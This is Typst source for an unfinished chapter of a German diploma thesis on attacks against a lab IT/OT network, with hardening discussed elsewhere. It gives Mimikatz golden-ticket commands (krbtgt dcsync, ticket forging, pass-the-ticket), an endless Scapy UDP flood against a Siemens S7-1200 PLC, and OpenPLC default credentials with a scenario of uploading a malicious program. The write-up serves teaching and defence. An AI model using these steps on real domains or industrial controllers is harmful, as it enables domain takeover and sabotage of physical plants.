#import "@preview/htl3r-da:1.0.0" as htl3r

#htl3r.author("David Koch")
= Angriffe auf das Netzwerk <angriffe-netzwerk>

#htl3r.author("David Koch")
== Einführung

Um die Sicherheit der in den obigen Abschnitten erstellten Topologie,  herkömmlicher Firmennetzwerke mit #htl3r.short[ot]-Abschnitten oder die Netzwerke von echter kritischer Infrastruktur zu gewährleisten braucht es ein theoretisches Verständnis von den möglichen Angriffsvektoren als auch die dazugehörige Absicherung, um gegen die bekannten Angriffsvektoren vorzugehen und somit Angriffen vorzubeugen.

=== Sicherheitsmängel bei Bus-Systemen
Im Vergleich zu anderen digitalen Netzwerksystemen der heutigen Zeit sind Bussysteme vom Grundprinzip aus außerordentlich unsicher und leicht manipulierbar. Alle Geräte eines Bussystems hängen an einer Broadcast-Domain. Das bedeutet, dass alle Geräte jeweils alle Informationen, die über den Bus geschickt werden, mitlesen können. Noch dazu werden die über den Bus versendeten Daten unter anderem nicht auf einen legitimen Absender oder Datensatz kontrolliert. Zwar bieten manche #htl3r.short[tcp]/IP-enkapsulierten Bussysteme eine verschlüsselte Ende-zu-Ende-Kommunikation, jedoch sind diese in der Industrie nur selten umgesetzt. Konzepte wie die CIA-Triade und das Triple-A-System sind der Bus-Welt fremd.

#htl3r.fspace(
  total-width: 95%,
  [
    #figure(
      image("../assets/Bus_Insecurity.png"),
      caption: [Übersicht eines Coil-Werte-Spoofings auf einem Modbus-RTU-Bus]
    )
    <coil-spoofing>
  ]
)

Im Falle eines Angriffs auf ein Bussystem und somit auf das gesamte #htl3r.short[ot]-Netzwerk liegen dem Angreifer viele Möglichkeiten vor, große Schäden anzurichten. Ob nun lediglich alle Informationen mitgehört werden, Werte gefälscht beziehungsweise gespoofed werden wie in @coil-spoofing oder doch eine #htl3r.short[dos]-Attacke auf eine #htl3r.short[sps] innerhalb des Bussystems stattfindet, um den gesamten Betrieb lahmzulegen, ist offen. Eines ist jedoch klar: Durch eine ausreichende Absicherung des Übergangs zwischen #htl3r.short[it] und #htl3r.short[ot], das heißt der Firewall auf Ebene 2.5 des Purdue-Modells (siehe @purdue), sind Angriffe auf das #htl3r.short[ot]-Netzwerk leicht vermeidbar. Beispielsweise sollte bei der Ausbreitung eines Netzwerkwurms innerhalb des #htl3r.short[it]-Netzwerks dieser keinesfalls auch in das #htl3r.short[ot]-Netzwerk gelangen können.

#htl3r.todo("BILD FIREWALL")

=== Stuxnet <stuxnet>
Der 2010 entdeckte Stuxnet-Computerwurm ist ein Schadprogramm, dass speziell entwickelt wurde zum Angriff auf ein #htl3r.short[scada]-System, das #htl3r.shortpl[sps] des Herstellers Siemens vom Typ Simatic S7 verwendet @stuxnet-1[comp]. Da bis Ende September 2010 der Iran den größten Anteil der infizierten Computer besaß und es zu außergewöhnlichen Störungen im iranischen Atomprogramm kam, lag es nah, dass Stuxnet hauptsächlich entstand, um als Schadsoftware die Leittechnik (Zentrifugen) der Urananreicherungsanlage in Natanz oder des Kernkraftwerks Buschehr zu stören @ndu-stuxnet.

Stuxnet gilt aufgrund seiner Komplexität und des Ziels, Steuerungssysteme von Industrieanlagen zu sabotieren, als bisher einzigartig @spiegel-10-jahre-stuxnet[comp]. Das heißt aber nicht, dass in der Zukunft nicht noch weitere Netzwerkwürmer auf das Internet losgelassen werden, deren Hauptziel es sein wird, #htl3r.short[ot]-Netzwerke lahmzulegen.

=== Lateral Movement

Der Begriff "Lateral Movement" beschreibt das Vorgehen von Angreifern sich innerhalb des attackierten Netzwerks vom einem System zum nächsten auszubreiten, Schwachstellen auszukundschaften, Rechteausweitung (engl. privilege escalation) durchzuführen und ihr endgültiges Angriffsziel zu erreichen. @lateral-movement-def[comp]

Bei der Durchführung von Lateral Movement gibt es einige bekannte Techniken, sogenannte Lateral Movement Techniques bzw. #htl3r.longpl[lmp] (#htl3r.shortpl[lmp]):

#htl3r.fspace(
  total-width: 100%,
  figure(
    table(
      columns: (11em, auto, 6em, 6em),
      inset: 10pt,
      align: (horizon + left, horizon + left, horizon + center, horizon + center),
      table.header(
        [*Bezeichnung*], [*Beschreibung*], [*Wahrscheinlichkeit*], [*Erkennbarkeit*],
      ),
      "Internal Spear Phishing", "Angreifer nutzt das kompromitierte E-Mail-Konto eines Mitarbeiters aus, um mit dessen Identität andere Mitarbeiter zu phishen.", "Hoch", "Mittel",
      [#htl3r.long[lotl] (#htl3r.short[lotl])], "Angreifer nutzt die ihm bereits verfügbaren Admin-Tools um unaufällig in den Betriebsprozess einzugreifen und weitere Informationen zu erhalten.", "Hoch", "Mittel/Schwer",
      "Default/Hardcoded Credentials", "Angreifer kann durch die öffentlich bekannten Standard-Zugangsdaten von im Netzwerk eingesetzer Software/Hardware diese übernehmen.", "Niedrig", "Einfach",
      "Remote Services", [Die für routinemäßige Systemadministration erlaubten Kommunikationsschnittstellen wie #htl3r.short[rdp] oder #htl3r.short[ssh] werden vom Angreifer ausgenutzt, um sich weiter im Netzwerk auszubreiten.], "Mittel", "Mittel",
      "Valid Accounts", "Die durch z.B. Phishing erhaltenen Anmeldeinformationen erlauben dem Angreifer, sich als legitimer Benutzer auszugeben.", "Hoch", "Schwer"
    ),
    caption: [Bekannte Lateral Movement Paths @lmp-list-1[comp], @lmp-list-2[comp]],
  )
)

#pagebreak(weak: true)
Die obigen Techniken sind natürlich miteinander kombinierbar, z.B. #htl3r.short[lotl] und Remote Services. Es ist ebenfalls zu beachten, dass die Bewertung der Wahrscheinlichkeit und Erkennbarkeit in der obigen Tabelle von einer bestehenden Absicherung des Netzwerks und vorhandenen #htl3r.short[ids]-Geräten ausgeht.

#htl3r.fspace(
  total-width: 95%,
  figure(
    image("../assets/LMPs_Ungesichert.png"),
    caption: [Die möglichen LMPs innerhalb eines ungesicherten Netzwerks]
  )
)

Bevor der Angreifer jedoch mögliche #htl3r.shortpl[lmp] ausnutzen kann, muss dieser überhaupt in das Netzwerk eindringen. Dies geschieht meist durch Identity-Angriffe wie Phishing-Mails, aber auch durch maliziöse Downloads und bereits kompromitierte Hardware.

Zur Entdeckung von möglicher Lateral-Movement-Aktivität im Netzwerk können folgende Strategien eingesetzt werden:

- Mögliche #htl3r.shortpl[lmp] innerhalb des eigenen Netzwerks vorab auskundschaften, quasi in Form einer Risikoanalyse. Mit der fertigen Risikoanalyse kann proaktiv gegen #htl3r.shortpl[lmp] vorgegangen werden, aber auch für den Angriffsfall ein #htl3r.long[icp] zur Reaktion auf die ausgenutzten Schwachstellen erstellt werden, falls die Vorbeugung dieser zu umständlich seien sollte.
- Netzwerküberwachungs-Tools bzw. #htl3r.shortpl[ids], die den Systemadministrator*innen Analysedaten über den Datenverkehr im Netzwerk liefern und somit auf die Ausnutzung eines #htl3r.short[lmp] hinweisen.
- In Kombination mit der Nutzung von Überwachungs-Tools detailierte Dokumentationen führen, welche Geräte und Benutzer sich im Netzwerk aufhalten sollten und welche Rollen sie haben, um bei der Erkennung von unbekannten Geräten im Netzwerk als auch bei unberechtigten Zugriffen zu helfen.
@lateral-movement-def[comp]

Zur Verhinderung von Lateral Movement können unter anderem Netzwerksegmentierung, Patchmanagement zur Behebung von bekannten Sicherheitslücken als auch Zugriffskontrolle auf bestimmte Daten, Geräte oder Netzwerkabschnitte implementiert werden.
@lateral-movement-def[comp]

Die Umsetzung dieser Entdeckungs- als auch Verhinderungsstrategien in der "Fenrir"-Topologie wird in @netzwerkueberwachung, @firewall-config und @weitere-absicherung genauer beschrieben.

== Angriffe auf das IT-Netzwerk

#htl3r.author("David Koch")
=== Exchange

Nur selten passieren Angriffe, die als Endergebnisse beispielsweise die Störung des Exchange-Mail-Servers haben. Meistens wird die Präsenz eines Mail-Servers lediglich genutzt, um als "Sprungbrett" ins interne Netzwerk zu dienen durch Phishing-Angriffe.

#htl3r.todo("Phishing Angriff hier umsetzen")

=== Ransomware auf Endgeräten

Wenn bei einem Cyberangriff auf #htl3r.short[ot]-Infrastruktur der Profit und sonst kein strategisches Ziel im Vordergrund steht, ist ein Ransomware-Angriff der wahrscheinlichste. TODO

#htl3r.fspace(
  figure(
    image("../assets/wannacry.png"),
    caption: [Das berüchtigte Wannacry-Decryptor-Popup @wannacry-image]
  ),
)

TODO

=== Keylogging-Trojaner auf Endgeräten

TODO

#htl3r.author("Gabriel Vogler")
=== Golden-Ticket Angriff
Wenn ein Administrator vergisst, sich aus einem System auszuloggen, kann ein Angreifer ein Golden Ticket erstellen und dieses exportieren. Wenn der Angreifer ein Ticket hat, kann er sich als Administrator des #htl3r.long[ad] ausgeben und hat somit Zugriff auf alle Ressourcen des #htl3r.short[ad]. Ausgeführt kann diese Attacke mit dem Tool "Mimikatz" werden.

Es wird gestartet auf dem System mit dem angemeldeten Administrator. 
Im ersten Schritt wird Mimikatz gestartet und der NTLM-Hash von "krbtgt" ausgelesen. krbtgt ist der Benutzer, der die Tickets für das #htl3r.short[ad] signiert.
Das wurde mit folgendem Befehl realisiert:
#htl3r.code(caption: "Auslesen des NTLM-Hashes von krbtgt", description: none)[
```
lsadump::dcsync /domain:corp.fenrir-ot.at /user:krbtgt
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/01_krbtgt_Hash_auslesen.png"),
    caption: [Auslesen des NTLM-Hashes von krbtgt mit Mimikatz]
  )
)

Ab jetzt wird von einem beliebigen Client gearbeitet. Angemeldeter Benutzer ist `dkoch`. Jetzt wird vom #htl3r.short[sid] der Domain ausgelesen. Dazu wird ein Teil der #htl3r.short[sid] des Benutzers genommen und der letzte Teil abgeschnitten. Das wird mit folgendem Befehl realisiert:
#htl3r.code(caption: "Auslesen vom SID der Domain", description: none)[
```
whoami /user
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/02_SID_auslesen.png"),
    caption: [Auslesen vom #htl3r.short[sid] der Domain]
  )
)

Mit dem #htl3r.short[sid] wird jetzt ein Golden Ticket erstellt. Dazu wird der NTLM-Hash von krbtgt, der #htl3r.short[fqdn] der Domain und der Benutzername des Benutzers benötigt. Außerdem wird noch die ID des Administrators angegeben. Die ist Standardmäßig 500. Das wird mit folgendem Befehl realisiert:
#htl3r.code(caption: "Erstellen des Golden Tickets", description: none)[
```
kerberos::golden /user:<USER> /domain:<FQDN> /sid:<SID> /krbtgt:<NTLM-HASH> /id:500
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/03_golden_ticket_erstellen.png"),
    caption: [Erstellen des Golden Tickets]
  )
)

Das Ticket wird unter `ticket.kirbi` gespeichert. Das Ticket kann nun jederzeit verwendet werden, um sich als Administrator auszugeben. Das Ticket wird mit Mimikatz geladen und man kann anschließend eine Shell starten mit den Rechten des Administrators. 
#htl3r.code(caption: "Laden des Golden Tickets und Starten einer Shell", description: none)[
```
kerberos::ptt ticket.kirbi
misc::cmd
```
]

In der Shell kann dann Versucht werden, auf das C Laufwerk eines anderen Systems zuzugreifen. Dazu wird folgender Befehl ausgeführt:
#htl3r.code(caption: "Zugriff auf das C Laufwerk eines DCs", description: none)[
```cmd
pushd \\dc01.corp.fenrir-ot.at\c$
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/04_shell.png"),
    caption: [Zugriff auf das C Laufwerk eines DCs]
  )
)

Jetzt hat der Angreifer vollen Zugriff auf das C Laufwerk des Domain Controllers und somit auf das Zentrum des #htl3r.short[ad]. Das Golden Ticket hat auch eine Gültigkeit von standardmäßig 10 Jahren. Um Angriffe wie diesen zu vermeiden wird in @ad_hardening das #htl3r.long[ad] gehärtet.

#htl3r.author("David Koch")
== Angriffe auf das OT-Netzwerk

=== Physische Manipulation

Bevor man die digitale Absicherung des #htl3r.short[ot]-Netzwerks in Betracht zieht, sollte die physische Sicherheit der #htl3r.short[ot]-Umgebung bereits gewährleistet sein. Wenn eine unauthorisierte Person beispielsweise in eine Fabrik einbrechen und dort die Steuerungstechnik manipulieren sollte -- egal ob das durch die Trennung eines Kabels oder der gezielten Umprogrammierung einer #htl3r.short[sps] durch ihre serielle Schnittstelle passiert -- ist vom Schlimmsten auszugehen.

#htl3r.todo["Hier ein Bild, z.B. Durchtrennung Kabel"]

Die Menschheit ist sich schon seit langer Zeit über die Wichtigkeit der physischen Sicherheit bewusst, somit werden in den meisten industriellen Anlagen bereits Überwachungssysteme wie #htl3r.short[cctv] als auch Perimeterschutz durch Stacheldrahtzäune und Alarmanlagen eingesetzt.

Die Diplomarbeit fokussiert sich jedoch auf die Absicherung der Schnittstelle zwischen #htl3r.short[it]- und #htl3r.short[ot]-Netzwerken, das heißt, dass keine physische Absicherung stattfindet.

#htl3r.author("David Koch")
=== Netzwerkaufklärung <recon>

Bevor ein Angriff stattfinden kann, muss der Angreifer wissen, was es überhaupt im Netzwerk gibt und was für Schwachstellen ausgenutzt werden können. Dieser wichtige Schritt nennt sich Netzwerkaufklärung und kann mit vielen verschiedenen Tools durchgeführt werden. Im Rahmen der in diesem Projekt durchgeführten #htl3r.short[ot]-Angriffe werden Nmap und Metasploit verwendet, wobei Metasploit nicht nur der Netzwerkaufklärung sondern bereits auch dem Penetration-Testing dient.

#htl3r.fspace(
  total-width: 95%,
  figure(
    image("../assets/s7_1200_nmap.png"),
    caption: [Port-Scan der S7-1200 #htl3r.short[sps]]
  )
)

Bereits durch einen Port-Scan der #htl3r.short[sps] kann der Angreifer Informationen über mögliche Schwachstellen ergattern. Es sind derzeit folgende Ports offen, die eine Gefahr darstellen können:
- *TCP-Port 102:* Hostet den ISO-TSAP-Dienst, welcher dazu dient, um über die Siemens-SPS-Administrationssoftware STEP 7 per Fernwartung mit der SPS kommunizieren zu können und Einstellungen vorzunehmen. Dieser Port kann *nicht* deaktiviert werden.
- *UDP-Port 161:* Hostet den #htl3r.short[snmp]-Dienst und dient der Übermittlung von Logdaten an externe Log-Server. Ist standardmäßig aktiviert, kann und sollte aber für erhöhte Sicherheit deaktiviert werden.

...

METASPLOIT NIX GEHEN

Der #htl3r.short[cve]-2019-10936

#htl3r.author("David Koch")
=== DoS einer SPS <dos-sps>

Die CVE-Beschreibung von #htl3r.short[cve]-2019-10936 lautet: "Affected devices improperly handle large amounts of specially crafted #htl3r.short[udp] packets. This could allow an unauthenticated remote attacker to trigger a denial of service condition." @siemens-sps-dos-cve Es wird ebenfalls erwähnt, dass nur Firmware-Versionen unter v4.4.0 von dieser Schwachstelle betroffen sind. Wie bereits in @recon ermittelt worden ist, hat die auf der S7-1200 derzeit installierte Firmware die Version v4.3.1. Das heißt: Der Angriff kann beginnen.

Was mit "specially crafted #htl3r.short[udp] packets" gemeint ist, ist nicht näher beschrieben. In den meisten #htl3r.short[dos]-Angriffen handelt es sich bei diesen Packets meist um Buffer-Underflow- bzw. Buffer-Overflow-Payloads. Bei einem Underflow werden in den einzelnen Packets zu wenige Nutzdaten übermittelt, bei einem Overflow werden zu viele Nutzdaten übermittelt. Insgesamt werden diese Packets dann in sehr großen Mengen an das anzugreifende Gerät geschickt, um den #htl3r.short[dos]-Zustand auszulösen.

#htl3r.code(caption: "Erstellung und Versendung des UDP-Packets für den DoS-Angriff auf die S7-1200", description: none)[
```python
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

target_ip = "10.79.84.1"
target_port = 102
payload = b"A" * 1000

udp_packet = IP(dst=target_ip) / UDP(dport=target_port) / payload
while True:
    send(udp_packet, count=2000)
```
]

In Quellcode 7.1 wird die Python-Bibliothek Scapy verwendet, um das für den Buffer-Overflow benötigte #htl3r.short[udp]-Packet zu erstellen und anschließend an die #htl3r.short[sps] zu schicken.

#htl3r.author("David Koch")
=== Manipulation einer SPS

Ein Angreifer sollte unter keinen Umständen die Programmierlogik einer #htl3r.short[sps] manipulieren können. Im Vergleich zu einem #htl3r.short[dos]-Angriff auf eine #htl3r.short[sps] oder andere Geräte im #htl3r.short[ot]-Netzwerk kann durch die gezielte Umprogrammierung einer #htl3r.short[sps] ein viel größerer Schaden in einem Bruchteil der Zeit angerichtet werden.

Beim in @stuxnet beschriebenen Stuxnet-Angriff wurden bestimmte Register der S7-#htl3r.shortpl[sps] manipuliert. Der Angriff hat auf einem sogenannten "Zero-Day-Exploit" beruht, einer Schwachstelle, die dem Hersteller -- in diesem Fall Siemens -- noch nicht bekannt war. Da die Entdeckung eines Zero-Day-Exploits in einer Siemens #htl3r.short[sps] oder der OpenPLC-Codebasis den Rahmen dieser Diplomarbeit sprengen würde, wird ein vereinfachtes aber trotzdem realistisches Angriffsszenario zur Manipulation einer #htl3r.short[sps] durchgeführt. Dieses besteht aus einer von einem Angreifer per #htl3r.short[rdp]-Verbindung übernommenen Engineer-Workstation, welche Zugriff auf die Umprogrammierung von #htl3r.shortpl[sps] im #htl3r.short[ot]-Netzwerk hat.

... TODO

=== SCADA

#htl3r.author("David Koch")
== Konkretes Angriffsszenario

Durch die Kombination der oben angeführten möglichen Angriffe lässt sich ein konkretes Angriffsszenario konzipieren, welches in dieser Form auch in einem Echtbetrieb stattfinden könnte:

1. Eine Phishing Mail wird von außen (aus dem Internet) an die Buchhaltung geschickt.
2. Mittels gestohlener Identität eines Buchhaltungsmitarbeiters wird eine interne Spear-Phishing-Mail an einen #htl3r.short[ot]-Engineer geschickt, zum Beispiel bezüglich einer Inventurliste.
3. Angreifer nutzt die #htl3r.short[rdp]-Berechtigungen des #htl3r.short[ot]-Engineers um tiefer in die Anlage einzudringen.
4. #htl3r.long[lotl]: Angreifer sammelt über das #htl3r.short[scada]-System Infos, wie die Anlage intern ausschaut.
5. Angreifer entdeckt die Default Credentials auf der OpenPLC-#htl3r.short[sps].
6. Steuerung der zweiten Betriebszelle wird umprogrammiert.
7. Anlage kommt zum Stehen, nachhaltiger Schaden wurde angerichtet.

=== Phishing-Mail

Der Angriff beginnt -- wie viele andere Angriffe in der Realität auch -- mit einer Phishing-Mail. Zuerst wird eine E-Mail an eine Person geschickt, die regelmäßig mit externen Personen kontakt hat und es somit nicht unbedingt auffällt, wenn mit einer gefälschten Identität eine Phishing-Mail empfagen wird.

#htl3r.todo("mit gabi seinem exchange setup hier emails verschicken")

=== Spear-Phishing

Nachdem das E-Mail-Konto des Buchhaltungsmitarbeiters übernommen worden ist, wird dessen gestohlene Identität dazu ausgenutzt, eine weitere Phishing-Mail zu verschicken. Diesmal ist in dieser jedoch ein maliziöser Dateianhang enthalten, um nicht nur das Konto zu übernehmen, sondern das Gerät, auf dem die E-Mail geöffnet wird, mit einem Virus zu infizieren.

TODO

=== RDP Lateral Movement

TODO

=== Living of the Land

TODO

=== Default Credentials auf der SPS

Durch die flüchtige Implementierung bzw. eine mangelnde Härtung der OpenPLC-#htl3r.short[sps] wurden die Default-Anmeldedaten für das Webdashboard nicht geändert. Diese sind unabhängig von jeglichen Systembenutzern und müssen im Webdashboard unter "Users" manuell geändert werden.

Da der Angreifer bereits in der #htl3r.short[lotl]-Phase herausgefunden hat, dass eine OpenPLC-#htl3r.short[sps] im Einsatz ist und die Default-Anmeldedaten -- Benutzername sowie Passwort sind "openplc" -- im Internet auffindbar sind, hat er nun einen uneingeschränkten Admin-Zugriff auf die #htl3r.short[sps] der "Feinfiltration" und kann sie nach Belieben umprogrammieren.

#htl3r.fspace(
  figure(
    image("../assets/openplc/openplc_login.png", width: 70%),
    caption: [OpenPLC-Webdashboard-Login mit den Default-Admin-Credentials]
  )
)

=== SPS-Steuerung wird manipuliert <openplc-manipulation>

Mit dem uneingeschränkten Zugriff auf das OpenPLC-Webdashboard kann der Angreifer sein eigenes Programm hochladen. Bevor dies getan wird, ist es aus Angreifersicht sinnvoll, die Default-Anmeldedaten umzuändern. Wenn im Zuge des Angriffs ein sichtbarer Schaden verursacht wird und das Management der Kläranlage anfängt zu ermitteln, ist ein aufgrund von falschen Anmeldedaten unzugängliches Webdashboard -- als einzige Schnittstelle zur Umprogrammierung -- verheerend.

#htl3r.fspace(
  total-width: 100%,
  figure(
    image("../assets/openplc/openplc_programs.png"),
    caption: [Das bösartige Programm `MALICIOUS_PROGRAM.st` wird hochgeladen]
  )
)

Nach dem erfolgreichen Hochladen des bösartigen Programms ändert der Angreifer auch das Admin-Passwort im Webdashboard unter #htl3r.breadcrumbs(("Users", "OpenPLC User", "Edit User")):

#htl3r.fspace(
  figure(
    image("../assets/openplc/openplc_change_user.png"),
    caption: [OpenPLC-Webdashboard-Login mit den Default-Admin-Credentials]
  )
)

=== GAU tritt ein

Das Netzwerk wurde aufgrund von fehlender Segmentierung infiltriert, das Lateral Movement des Angreifers wurde wegen fehlender Netzwerküberwachung nicht entdeckt. Eine für die Steuerung des Klärprozesses unabdingbare SPS wurde umprogrammiert und unzugänglich gemacht. 

Damit durch die manipulierte Steuerung keine weiteren Flutungen zustande kommen, muss die gesamte Anlage gestoppt werden -- der größte anzunehmende Unfall (#htl3r.short[gau]) tritt ein. Damit die Kläranlage wieder klären kann, muss die #htl3r.short[sps] für die Feinfiltration zurückgesetzt werden und das gesamte Netzwerk gesäubert werden, ob durch Virenscans oder sicherheitshalber einem Ersetzen der Geräte.
